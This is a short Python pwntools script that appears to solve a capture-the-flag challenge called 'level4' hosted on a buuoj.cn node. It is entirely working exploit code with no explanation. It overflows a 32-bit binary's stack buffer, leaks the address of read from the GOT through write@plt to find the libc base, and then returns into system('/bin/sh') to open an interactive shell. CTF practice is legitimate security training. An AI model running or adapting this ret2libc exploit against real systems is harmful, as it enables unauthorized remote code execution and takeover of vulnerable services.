from pwn import *

context.log_level = 'debug'
# io = process('level4')
io = remote('node4.buuoj.cn', 25962)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('level4')
main_addr = elf.symbols['main']
write_plt = elf.plt['write']
read_got = elf.got['read']

payload = cyclic(0x8c) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(4)
io.sendline(payload)
libc_base = u32(io.recvn(4)) - libc.symbols['read']
log.success('libc_base: ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = cyclic(0x8c) + p32(system_addr) + cyclic(4) + p32(bin_sh_addr)
io.sendline(payload)
io.interactive()

